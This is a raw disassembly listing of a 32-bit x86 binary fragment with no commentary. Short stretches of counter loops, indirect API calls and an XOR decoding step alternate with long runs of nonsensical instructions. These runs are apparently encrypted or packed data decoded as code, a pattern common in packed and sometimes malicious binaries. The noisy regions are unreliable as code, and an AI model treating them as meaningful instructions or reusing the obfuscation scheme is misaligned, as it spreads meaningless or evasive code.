  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a885,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7c9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a76d
  407014:	sub    DWORD PTR ds:0x42a841,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0x70,al
  40702c:	pop    ebp
  40702d:	cmp    DWORD PTR [eax],esi
  40702f:	pop    eax
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407072
  407038:	cmp    eax,0xf8aebfdc
  40703d:	pop    ebp
  40703e:	(bad)  
  40703f:	nop
  407040:	mov    ds:0x2b95e053,al
  407045:	push   0x1ef7adc7
  40704a:	push   cs
  40704b:	call   0xb950184d
  407050:	dec    ebp
  407051:	das    
  407052:	inc    esi
  407053:	mov    bh,0xbd
  407055:	dec    ecx
  407056:	outs   dx,BYTE PTR ds:[esi]
  407057:	xor    eax,DWORD PTR [edi+edx*2]
  40705a:	mov    ecx,0xfc830d61
  40705f:	jge    0x406ffe
  407061:	cmc    
  407062:	int    0xcb
  407064:	xchg   ebx,eax
  407065:	fninit 
  407067:	ins    BYTE PTR es:[edi],dx
  407068:	mov    bh,BYTE PTR [ecx]
  40706a:	mov    al,0x7a
  40706c:	into   
  40706d:	cdq    
  40706e:	inc    BYTE PTR [ecx+ecx*4+0x67c30353]
  407075:	repnz sti 
  407077:	loope  0x4070c3
  407079:	mov    fs,WORD PTR [edx]
  40707b:	icebp  
  40707c:	mov    DWORD PTR [edx-0x3deb5011],ebp
  407082:	jae    0x40705a
  407084:	inc    ecx
  407085:	xor    al,BYTE PTR [eax-0x20]
  407088:	retf   0x1200
  40708b:	mov    ecx,0xa08703f6
  407090:	pushf  
  407091:	adc    esi,DWORD PTR [esp+esi*4+0x5b3601b0]
  407098:	rcr    BYTE PTR [ecx+0x2febb17],cl
  40709e:	mov    eax,ds:0x601782ec
  4070a3:	adc    DWORD PTR [eax+0x3c],edx
  4070a6:	mov    ds:0x73c96c39,eax
  4070ab:	xchg   ebp,eax
  4070ac:	dec    al
  4070ae:	nop
  4070af:	pop    edi
  4070b0:	jno    0x407079
  4070b2:	push   0x84875a4f
  4070b7:	xor    al,0x2a
  4070b9:	xor    dh,BYTE PTR [edi-0xb]
  4070bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070bd:	test   BYTE PTR [edi+0x46],0x30
  4070c1:	daa    
  4070c2:	inc    esi
  4070c3:	cmp    al,0x9c
  4070c5:	in     eax,0xf8
  4070c7:	push   0xda639147
  4070cc:	or     DWORD PTR [edi],esi
  4070ce:	xchg   esi,eax
  4070cf:	call   0xdc353260
  4070d4:	dec    ecx
  4070d5:	or     ah,ch
  4070d7:	pop    esp
  4070d8:	retf   
  4070d9:	pop    es
  4070da:	mov    eax,ds:0xfd392424
  4070df:	into   
  4070e0:	or     DWORD PTR [ecx-0x25],0x6ab57937
  4070e7:	daa    
  4070e8:	mov    ch,0x5d
  4070ea:	push   ss
  4070eb:	push   0xffffffd0
  4070ed:	mov    edi,0x175a9f60
  4070f2:	jns    0x4070b2
  4070f4:	mov    ebx,0x14593993
  4070f9:	in     al,dx
  4070fa:	pop    eax
  4070fb:	and    al,bh
  4070fd:	ds in  al,dx
  4070ff:	repz ret 0xc9df
  407103:	pop    edi
  407104:	push   ss
  407105:	pop    edx
  407106:	pop    ds
  407107:	daa    
  407108:	fsubr  QWORD PTR [edx]
  40710a:	mov    ah,0xd4
  40710c:	dec    eax
  40710d:	sar    DWORD PTR [ecx],cl
  40710f:	fld    DWORD PTR [edx]
  407111:	and    BYTE PTR [ebx+0x20],dh
  407114:	or     al,0x3d
  407116:	xchg   esp,eax
  407117:	or     eax,eax
  407119:	(bad)  
  40711a:	or     ah,BYTE PTR [eax-0x3850f68]
  407120:	cmc    
  407121:	pop    DWORD PTR [eax]
  407123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407124:	mul    BYTE PTR [esi-0x26cada3d]
  40712a:	shr    BYTE PTR [edi],1
  40712c:	adc    al,0x8f
  40712e:	cmc    
  40712f:	popf   
  407130:	jecxz  0x407113
  407132:	push   ecx
  407133:	sbb    BYTE PTR [ecx*8+0x460b3775],ch
  40713a:	outs   dx,BYTE PTR ds:[esi]
  40713b:	rol    DWORD PTR [edx-0x67b36341],0xcc
  407142:	stos   BYTE PTR es:[di],al
  407144:	jle    0x407127
  407146:	popfw  
  407148:	in     eax,dx
  407149:	cmp    al,0x41
  40714b:	pusha  
  40714c:	xchg   ebp,eax
  40714d:	mov    dl,0xe1
  40714f:	std    
  407150:	and    DWORD PTR [ecx+0x41],esp
  407153:	imul   ebx,eax,0xffffff82
  407156:	push   edi
  407157:	aam    0xc1
  407159:	add    BYTE PTR [edx+ebx*1],ch
  40715c:	pop    ss
  40715d:	rcl    DWORD PTR [esi+0x79],0xe4
  407161:	ss and ah,bh
  407164:	in     eax,0xe7
  407166:	inc    ecx
  407167:	push   eax
  407168:	inc    ebx
  407169:	(bad)  
  40716b:	sub    BYTE PTR [ebx],dh
  40716d:	jge    0x40716e
  40716f:	xor    ch,bh
  407171:	out    dx,eax
  407172:	xchg   esp,eax
  407173:	or     al,bh
  407175:	sbb    DWORD PTR [esi],0xfffffffd
  407178:	data16 mov ah,0xd6
  40717b:	test   eax,0x5c96da65
  407180:	fldenv [edx+0x1a411161]
  407186:	test   eax,0x666df182
  40718b:	rcl    BYTE PTR ds:0x20e06e21,cl
  407191:	mov    edi,0xc2253927
  407196:	dec    edi
  407197:	cmp    eax,0x98f92d8c
  40719c:	mov    eax,ds:0x7994b87
  4071a1:	sbb    bh,BYTE PTR [edx+0x2a]
  4071a4:	mov    edx,0x89f02b2a
  4071a9:	ins    BYTE PTR es:[edi],dx
  4071aa:	dec    ebp
  4071ab:	cs push esi
  4071ad:	cmp    ebp,ebx
  4071af:	xor    edx,esi
  4071b1:	lods   al,BYTE PTR ds:[esi]
  4071b2:	fsub   QWORD PTR [ebx]
  4071b4:	js     0x407142
  4071b6:	in     eax,0x35
  4071b8:	push   ebp
  4071b9:	pop    ss
  4071ba:	retf   0xe6c
  4071bd:	xor    BYTE PTR [ebp-0x30135945],bl
  4071c3:	fwait
  4071c4:	push   eax
  4071c5:	cmp    BYTE PTR [edi+esi*1],bl
  4071c8:	or     cl,dl
  4071ca:	jo     0x4071cf
  4071cc:	cwde   
  4071cd:	clc    
  4071ce:	(bad)  
  4071cf:	in     eax,0xb4
  4071d1:	repnz stos DWORD PTR es:[edi],eax
  4071d3:	pop    eax
  4071d4:	mov    ecx,0x15bc57ab
  4071d9:	mov    BYTE PTR [eax-0x13],0x88
  4071dd:	stos   DWORD PTR es:[edi],eax
  4071de:	or     DWORD PTR [ebp+0x5e533518],ebp
  4071e4:	cdq    
  4071e5:	loope  0x4071f5
  4071e7:	fst    DWORD PTR [eax+0x4a]
  4071ea:	and    eax,0xc5052e66
  4071ef:	in     eax,dx
  4071f0:	fld    QWORD PTR [edi+0x72552ed5]
  4071f6:	jmp    0x28bd:0x70b66423
  4071fd:	sub    ch,bl
  4071ff:	(bad)  
  407200:	jg     0x407257
  407202:	xchg   esi,eax
  407203:	jbe    0x4071ae
  407205:	and    eax,0x37b1f4c6
  40720a:	(bad)  
  40720b:	(bad)  
  40720c:	out    dx,eax
  40720d:	lahf   
  40720e:	or     cl,BYTE PTR [eax-0x7d8f7e81]
  407214:	cli    
  407215:	outs   dx,DWORD PTR ds:[esi]
  407216:	dec    eax
  407217:	adc    BYTE PTR [esi+0x6ff6afea],bl
  40721d:	sahf   
  40721e:	push   cs
  40721f:	out    0x4f,al
  407221:	pop    ss
  407222:	mov    DWORD PTR [ebx],0xa377fbc9
  407228:	stos   DWORD PTR es:[edi],eax
  407229:	test   DWORD PTR [ecx+0x4],edx
  40722c:	sbb    eax,0x554304ff
  407231:	cmp    BYTE PTR gs:[ecx-0x7b],ah
  407235:	mov    ecx,0x42e11b90
  40723a:	xchg   esi,eax
  40723b:	scas   eax,DWORD PTR es:[edi]
  40723c:	pop    esi
  40723d:	mov    bh,0xf1
  40723f:	sbb    eax,0x9d209169
  407244:	cmp    BYTE PTR [esi+edi*4],ah
  407247:	clc    
  407248:	push   ebx
  407249:	rol    BYTE PTR [edx],0x75
  40724c:	mov    DWORD PTR [ebx+0x6e],esp
  40724f:	pop    edx
  407250:	call   0x5dad8899
  407255:	fucomp st(4)
  407257:	neg    DWORD PTR [eax+0x1c3090b2]
  40725d:	test   BYTE PTR [edx+0x4],ch
  407260:	push   ecx
  407261:	sbb    eax,0xa2e5a9bd
  407266:	ret    
  407267:	adc    eax,0x97534d7c
  40726c:	test   BYTE PTR es:[edx+0x6b],dl
  407270:	push   ecx
  407271:	in     al,dx
  407272:	rol    BYTE PTR [ecx+0x1d],0x23
  407276:	push   esp
  407277:	sti    
  407278:	std    
  407279:	cwde   
  40727a:	sbb    eax,0x515c0cdc
  40727f:	mov    esp,0xf6079d58
  407284:	fmul   QWORD PTR [eax+0x4b4552e]
  40728a:	push   esp
  40728b:	pop    edi
  40728c:	call   0xe34b4494
  407291:	or     BYTE PTR [edx-0xa],cl
  407294:	push   0x95f1cec9
  407299:	or     cl,BYTE PTR [ecx-0x2101dbf3]
  40729f:	(bad)  
  4072a1:	inc    ebp
  4072a2:	inc    esp
  4072a3:	imul   esi,DWORD PTR [ebp-0x3c1c6620],0x4853d395
  4072ad:	loopne 0x407257
  4072af:	xor    BYTE PTR [esi-0x1d7db88d],dh
  4072b5:	int    0x3c
  4072b7:	sub    BYTE PTR [ecx],ch
  4072b9:	iret   
  4072ba:	push   ds
  4072bb:	pop    dx
  4072bd:	xlat   BYTE PTR ds:[ebx]
  4072be:	imul   edi,DWORD PTR [ebx-0xda2cdd],0x1886f8a0
  4072c8:	in     eax,dx
  4072c9:	inc    edx
  4072ca:	cs test eax,0x884ff54c
  4072d0:	push   edx
  4072d1:	dec    ecx
  4072d2:	sbb    BYTE PTR [edi+edx*4],bl
  4072d5:	sbb    eax,0x7ee0a84
  4072da:	xor    ebx,DWORD PTR [ecx-0x7bfd7d10]
  4072e0:	fwait
  4072e1:	pop    esp
  4072e2:	arpl   dx,cx
  4072e4:	mov    bh,0x64
  4072e6:	aas    
  4072e7:	add    DWORD PTR [edx+0x14],esi
  4072ea:	test   eax,0x35717756
  4072ef:	bound  ecx,QWORD PTR [esi+0x78]
  4072f2:	nop
  4072f3:	in     al,dx
  4072f4:	add    eax,0x28190400
  4072f9:	sar    BYTE PTR [eax+ebx*1+0x29b95936],1
  407300:	dec    esp
  407301:	ins    DWORD PTR es:[edi],dx
  407302:	xor    al,0xbf
  407304:	fcom   DWORD PTR [edx+0x3c2c22b8]
  40730a:	arpl   WORD PTR [edx],bp
  40730c:	mov    eax,ds:0xae713a20
  407311:	inc    edi
  407312:	jae    0x407383
  407314:	nop
  407315:	sbb    al,0x16
  407317:	or     eax,0x4495a637
  40731c:	ror    BYTE PTR [ebp+edi*1+0x73],cl
  407320:	enter  0xfbc5,0xc6
  407324:	inc    ebp
  407325:	(bad)  
  407326:	jg     0x4072b5
  407328:	inc    ebp
  407329:	inc    DWORD PTR [ecx+0x42a77925]
  40732f:	add    BYTE PTR [eax],al
  407331:	add    BYTE PTR [eax],al
  407333:	add    cl,ch
  407335:	or     eax,0x8b000000
  40733a:	or     eax,0x42a779
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a779,ecx
  407346:	cmp    DWORD PTR ds:0x42a779,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a779,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a889
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a779,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a779
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a779,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x1ba0e48,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x4073fa
  4073b7:	jle    0x4073d7
  4073b9:	(bad)  
  4073ba:	pop    esi
  4073bb:	test   DWORD PTR [ebx],0x2a5f00f6
  4073c1:	ins    DWORD PTR es:[edi],dx
  4073c2:	ins    DWORD PTR es:[edi],dx
  4073c3:	push   DWORD PTR [ebx]
  4073c5:	xor    al,0xc1
  4073c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073c8:	repz jl 0x407438
  4073cb:	or     edi,eax
  4073cd:	cwde   
  4073ce:	ins    DWORD PTR es:[edi],dx
  4073cf:	xchg   edi,eax
  4073d0:	inc    ebp
  4073d1:	fstp   QWORD PTR [ebp+0x5b2ea129]
  4073d7:	cmp    esi,ebp
  4073d9:	and    BYTE PTR [eax+0x31],ch
  4073dc:	pop    ebx
  4073dd:	xor    ch,BYTE PTR [ecx-0x1c8c0f4a]
  4073e3:	pop    es
  4073e4:	ss mov al,0xe7
  4073e7:	imul   ebx,DWORD PTR [esi-0x57],0xfbee734e
  4073ee:	xor    eax,0x232c7e9c
  4073f3:	test   BYTE PTR [edi],bh
  4073f5:	dec    esi
  4073f6:	ret    0x29df
  4073f9:	mov    bh,0xdd
  4073fb:	hlt    
  4073fc:	sbb    edx,ecx
  4073fe:	sub    dh,BYTE PTR [edx]
  407400:	ret    
  407401:	jmp    0xb4d4:0x1518bb7a
  407408:	pusha  
  407409:	(bad)  
  40740a:	ret    0x85a1
  40740d:	test   eax,0xbc56f17f
  407412:	add    esp,DWORD PTR ss:[edx-0x4a7608a9]
  407419:	(bad)  
  40741a:	loop   0x40748d
  40741c:	mov    es,WORD PTR [ebp+0x7d4c0691]
  407422:	test   BYTE PTR [eax+0x51716c91],dl
  407428:	imul   ebp,DWORD PTR [esi-0x1797ebe3],0xffffff87
  40742f:	push   edx
  407430:	out    dx,al
  407431:	pop    esp
  407432:	daa    
  407433:	adc    ebx,DWORD PTR [esi]
  407435:	pop    DWORD PTR [esi+0x75]
  407438:	mov    cl,0xfc
  40743a:	call   0xea71e5fb
  40743f:	pop    edx
  407440:	icebp  
  407441:	inc    esp
  407442:	mov    cl,al
  407444:	jne    0x4073e7
  407446:	or     al,dh
  407448:	push   cs
  407449:	sbb    BYTE PTR [esp+ebx*8],ch
  40744c:	int    0xef
  40744e:	mov    ecx,es
  407450:	call   0xe1b1:0x443fcc45
  407457:	jmp    0x2422:0x46760b18
  40745e:	leave  
  40745f:	or     DWORD PTR [esi-0x45],edx
  407462:	xor    ebx,edx
  407464:	cdq    
  407465:	xchg   edi,eax
  407466:	mov    BYTE PTR [esi-0x6566c06],ah
  40746c:	jle    0x40745e
  40746e:	sti    
  40746f:	ds retf 0x8d32
  407473:	xchg   edx,eax
  407474:	mov    edi,0xadc8b8ec
  407479:	outs   dx,BYTE PTR ds:[esi]
  40747a:	fisubr WORD PTR [eax+0x196c7ebe]
  407480:	cdq    
  407481:	pop    esp
  407482:	retf   
  407483:	imul   edi,DWORD PTR [eax],0xff4e20db
  407489:	in     eax,dx
  40748a:	shl    DWORD PTR [edi-0x92896d1],0xe4
  407491:	mov    dl,0x57
  407493:	or     BYTE PTR [esi+eax*8+0x7061c464],0x4a
  40749b:	popa   
  40749c:	or     eax,0xd6fd846e
  4074a1:	pop    ss
  4074a2:	and    al,0x6c
  4074a4:	cmp    edx,DWORD PTR ds:[ebx+0xe]
  4074a8:	rol    DWORD PTR [esi+0x73],1
  4074ab:	shr    edx,cl
  4074ad:	pop    edi
  4074ae:	adc    BYTE PTR [edi+0x21],dh
  4074b1:	dec    ebp
  4074b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074b3:	pop    es
  4074b4:	push   esp
  4074b5:	mov    edi,0x9b6d6861
  4074ba:	xor    BYTE PTR [edi-0x54],dh
  4074bd:	icebp  
  4074be:	sub    cl,BYTE PTR [esi]
  4074c0:	adc    edi,ebp
  4074c2:	imul   edx,ebp,0x2
  4074c5:	inc    esp
  4074c6:	data16 mov bl,0x25
  4074c9:	stc    
  4074ca:	jae    0x407534
  4074cc:	mov    ch,0x4f
  4074ce:	les    ebp,FWORD PTR [ebp+edx*8+0x70]
  4074d2:	jne    0x40754e
  4074d4:	add    DWORD PTR [ebx+0x36],0x8ef4e057
  4074db:	les    ebp,FWORD PTR [eax-0x457146d9]
  4074e1:	pop    edx
  4074e2:	push   cs
  4074e3:	leave  
  4074e4:	pop    ss
  4074e5:	hlt    
  4074e6:	test   eax,0x93b1f4ff
  4074eb:	in     al,dx
  4074ec:	sbb    ch,BYTE PTR [edi]
  4074ee:	into   
  4074ef:	and    eax,0x49e8f640
  4074f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074f5:	adc    DWORD PTR [edi+0x46],edi
  4074f8:	imul   ecx,DWORD PTR [ecx+0x1a],0x6d31aecb
  4074ff:	loop   0x40754f
  407501:	dec    esp
  407502:	inc    eax
  407503:	bound  eax,QWORD PTR [ebx]
  407505:	sbb    eax,0x357e3ed9
  40750a:	pop    esi
  40750b:	popf   
  40750c:	pop    ds
  40750d:	push   ebp
  40750e:	(bad)  
  40750f:	xchg   esi,eax
  407510:	mov    eax,DWORD PTR [edx+ebx*4-0x6d]
  407514:	adc    DWORD PTR [edi+0x34],edi
  407517:	cmp    al,0xa5
  407519:	or     eax,0x4d584adf
  40751e:	mov    ebp,0x390aeaf1
  407523:	cs icebp 
  407525:	jae    0x4074c8
  407527:	add    ecx,ecx
  407529:	sub    BYTE PTR [ebp-0x1649138],0xff
  407530:	xchg   edi,eax
  407531:	into   
  407532:	or     al,BYTE PTR ds:0x2b1c6ef5
  407538:	stc    
  407539:	mov    ds:0x626a04b5,al
  40753e:	pop    ebx
  40753f:	push   0x33
  407541:	dec    ebx
  407542:	xchg   ebx,esi
  407544:	add    eax,DWORD PTR [edx-0x573ae154]
  40754a:	adc    BYTE PTR [ebx],0x58
  40754d:	not    BYTE PTR [esi+0x69]
  407550:	cld    
  407551:	push   0xffffffda
  407553:	push   0x27c9be0c
  407558:	inc    edi
  407559:	pop    eax
  40755a:	mov    eax,0x8554d791
  40755f:	std    
  407560:	mov    dl,0x8e
  407562:	or     bh,al
  407564:	push   DWORD PTR [eax]
  407566:	jbe    0x4075d3
  407568:	fcomip st,st(0)
  40756a:	andps  xmm2,XMMWORD PTR [edx]
  40756d:	xor    ch,BYTE PTR [ebx]
  40756f:	mov    ebp,0x5ccf368e
  407574:	mov    edi,0x73625cc0
  407579:	int3   
  40757a:	add    eax,0x6f9b46c9
  40757f:	sub    al,0x5e
  407581:	cmp    esp,DWORD PTR [ecx+ebx*1-0x7d7a8fe0]
  407588:	loope  0x4075bc
  40758a:	mov    esi,0xb98be567
  40758f:	into   
  407590:	sbb    al,0x31
  407592:	fnstcw WORD PTR [ebp+0x5cf017e6]
  407598:	in     al,dx
  407599:	cwde   
  40759a:	mov    esi,0x7c6dcfde
  40759f:	xchg   edi,eax
  4075a0:	pop    es
  4075a1:	sub    BYTE PTR [eax+edx*1],al
  4075a4:	test   BYTE PTR [ebx-0x729f1a8],dl
  4075aa:	scas   al,BYTE PTR es:[edi]
  4075ab:	xor    esp,DWORD PTR gs:[esi]
  4075ae:	cmc    
  4075af:	and    eax,0x8fed7ba
  4075b4:	xchg   ecx,eax
  4075b5:	mov    ds:0x9143f099,eax
  4075ba:	cli    
  4075bb:	mov    esi,0xd99dc48e
  4075c0:	repz xchg ecx,eax
  4075c2:	icebp  
  4075c3:	inc    esp
  4075c4:	pop    ebx
  4075c5:	xor    edx,DWORD PTR [edx+edx*2+0x3fff09b]
  4075cc:	or     al,dl
  4075ce:	add    al,0x46
  4075d0:	fbstp  TBYTE PTR [ebx-0x40]
  4075d3:	dec    edi
  4075d4:	icebp  
  4075d5:	and    BYTE PTR [edx+0x61],dh
  4075d8:	pop    edx
  4075d9:	call   0x2ad735a0
  4075de:	into   
  4075df:	js     0x4075b0
  4075e1:	mov    esp,esi
  4075e3:	xchg   ebx,eax
  4075e4:	outs   dx,DWORD PTR ds:[esi]
  4075e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075e6:	fs out dx,al
  4075e8:	lods   al,BYTE PTR ds:[esi]
  4075e9:	cmc    
  4075ea:	push   ds
  4075eb:	mov    ds:0x84032d6e,al
  4075f0:	push   ss
  4075f1:	add    BYTE PTR [eax],dh
  4075f3:	adc    ah,ah
  4075f5:	and    bl,BYTE PTR [eax]
  4075f7:	outs   dx,BYTE PTR ds:[esi]
  4075f8:	cmp    al,0x48
  4075fa:	or     DWORD PTR [edi+ecx*4-0x62],0xffffffe5
  4075ff:	in     al,0xb0
  407601:	int    0x98
  407603:	dec    ecx
  407604:	add    DWORD PTR [ebx+eax*8],0xffffffdb
  407608:	mov    edx,DWORD PTR [ebx-0x44]
  40760b:	inc    edi
  40760c:	lds    ecx,FWORD PTR [ebx-0xb]
  40760f:	js     0x4075e9
  407611:	inc    esi
  407612:	scas   eax,DWORD PTR es:[edi]
  407613:	pusha  
  407614:	jecxz  0x407619
  407616:	test   DWORD PTR [edx-0x6c],0x5ef7d1fe
  40761d:	packuswb mm4,QWORD PTR [ebp+ecx*1+0x538e71a3]
  407625:	std    
  407626:	mov    bh,0x8
  407628:	adc    bh,BYTE PTR [esp+ecx*2]
  40762b:	dec    edx
  40762c:	ror    BYTE PTR [edx-0x6319b309],0x46
  407633:	out    0xdf,eax
  407635:	ins    BYTE PTR es:[edi],dx
  407636:	cmp    al,0xd6
  407638:	outs   dx,BYTE PTR ds:[esi]
  407639:	fucom  st(3)
  40763b:	pop    ecx
  40763c:	lods   al,BYTE PTR ds:[esi]
  40763d:	push   ds
  40763e:	cmp    al,0x47
  407640:	jmp    FWORD PTR [ebx-0x11bbd7c1]
  407646:	bound  esp,QWORD PTR [eax]
  407648:	imul   esp,DWORD PTR ds:[edx],0xde348eb2
  40764f:	xor    edx,ecx
  407651:	mov    ecx,0xb1be018e
  407656:	ret    0x859a
  407659:	iret   
  40765a:	dec    ecx
  40765b:	iret   
  40765c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40765d:	sbb    dl,BYTE PTR [ebp-0x6c]
  407660:	xchg   DWORD PTR [edx-0x25],esi
  407663:	arpl   WORD PTR [eax-0x6f],ax
  407666:	push   esp
  407667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407668:	pop    eax
  407669:	pop    eax
  40766a:	and    DWORD PTR [eax+0x1c21b847],0x1cb506c9
  407674:	push   edx
  407675:	pop    esi
  407676:	sbb    BYTE PTR [edx],dh
  407678:	mov    esp,0xb1ab3aa7
  40767d:	outs   dx,BYTE PTR ds:[esi]
  40767e:	jne    0x40760a
  407680:	jle    0x407619
  407682:	add    ebx,edx
  407684:	pop    es
  407685:	scas   al,BYTE PTR es:[edi]
  407686:	add    DWORD PTR [ebp+0x61],edx
  407689:	xor    DWORD PTR [ecx+0x2aadbfa2],ecx
  40768f:	test   BYTE PTR [ebx],bl
  407691:	mov    esp,0x94ff2381
  407696:	imul   ecx
  407698:	jns    0x4076ea
  40769a:	mov    ch,0x63
  40769c:	and    BYTE PTR [ecx],bl
  40769e:	fnstcw WORD PTR [eax+0x24]
  4076a1:	mov    ebp,0x8af04589
  4076a6:	inc    ebp
  4076a7:	inc    DWORD PTR [ecx+0x42a7610d]
  4076ad:	add    al,bh
  4076af:	ins    BYTE PTR es:[edi],dx
  4076b0:	add    BYTE PTR [eax],al
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a83d,0x42a77d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7b9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7b9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7b9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7b9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7b9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7b9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7b9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7b9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx-0x6c518918],1
  407796:	inc    edi
  407797:	stc    
  407798:	icebp  
  407799:	mov    al,0xd6
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x407799
  4077a2:	cmp    al,0x28
  4077a4:	mov    es,ecx
  4077a6:	inc    ebx
  4077a7:	pop    ss
  4077a8:	retf   
  4077a9:	pop    ecx
  4077aa:	not    BYTE PTR [esi+0x69]
  4077ad:	add    esp,DWORD PTR [ebx*8-0x348219c5]
  4077b4:	hlt    
  4077b5:	aad    0xfe
  4077b7:	and    ebx,edi
  4077b9:	je     0x407835
  4077bb:	dec    edx
  4077bc:	scas   eax,DWORD PTR es:[edi]
  4077bd:	test   al,0x60
  4077bf:	inc    edi
  4077c0:	jne    0x40779b
  4077c2:	mov    ah,ch
  4077c4:	sti    
  4077c5:	push   esp
  4077c6:	arpl   ax,bx
  4077c8:	pop    esi
  4077c9:	xchg   esp,eax
  4077ca:	dec    esp
  4077cb:	hlt    
  4077cc:	adc    BYTE PTR [edx-0x582530b0],dh
  4077d2:	mov    edi,DWORD PTR [ecx]
  4077d4:	sub    al,bl
  4077d6:	test   DWORD PTR [ebp+0x7],ecx
  4077d9:	and    BYTE PTR [ebp-0x75f27e6],cl
  4077df:	pop    edi
  4077e0:	pop    ss
  4077e1:	or     eax,0xbb70df66
  4077e6:	lods   eax,DWORD PTR ds:[esi]
  4077e7:	cwde   
  4077e8:	pop    ebp
  4077e9:	loopne 0x4077bc
  4077eb:	imul   edx,edx,0xd32b36ff
  4077f1:	or     BYTE PTR [esi+0x47e93452],0xdf
  4077f8:	pop    ds
  4077f9:	dec    ecx
  4077fa:	xchg   ecx,eax
  4077fb:	adc    BYTE PTR [ebx],dh
  4077fd:	lea    esp,ds:0x987ae00e
  407803:	lds    eax,FWORD PTR [ecx+ebx*2]
  407806:	jecxz  0x407883
  407808:	out    0x51,eax
  40780a:	mov    dh,0x74
  40780c:	add    DWORD PTR [edi+eax*1-0x58],0x4d4d5bf5
  407814:	add    eax,0x1ceceb6b
  407819:	retf   0xfcf
  40781c:	jecxz  0x4077bc
  40781e:	popa   
  40781f:	add    ebp,DWORD PTR [eax]
  407821:	cwde   
  407822:	xchg   ebx,eax
  407823:	push   edx
  407824:	mov    cl,0x0
  407826:	pop    ecx
  407827:	cwde   
  407828:	js     0x407803
  40782a:	add    dl,dl
  40782c:	push   esp
  40782d:	mov    ch,BYTE PTR [ebx]
  40782f:	dec    eax
  407830:	aam    0x9b
  407832:	inc    edi
  407833:	mov    ds:0x56036118,eax
  407838:	xchg   dh,ch
  40783a:	push   0xfffffff1
  40783c:	push   0xffffffef
  40783e:	fsub   DWORD PTR [ecx-0x79]
  407841:	and    BYTE PTR [esi-0x5a429d01],ch
  407847:	(bad)  [ebx+0x51dc088]
  40784d:	add    esp,esp
  40784f:	nop
  407850:	or     DWORD PTR [ebx],esi
  407852:	ins    BYTE PTR es:[edi],dx
  407853:	cwde   
  407854:	mov    edi,0x24525294
  407859:	and    ah,0x51
  40785c:	gs sub eax,0x2b33b40
  407862:	scas   al,BYTE PTR es:[edi]
  407863:	cld    
  407864:	cmp    DWORD PTR [esi-0x5e],esp
  407867:	ficom  WORD PTR [esi+0x2af70c6c]
  40786d:	mov    BYTE PTR [edx-0x1c],ah
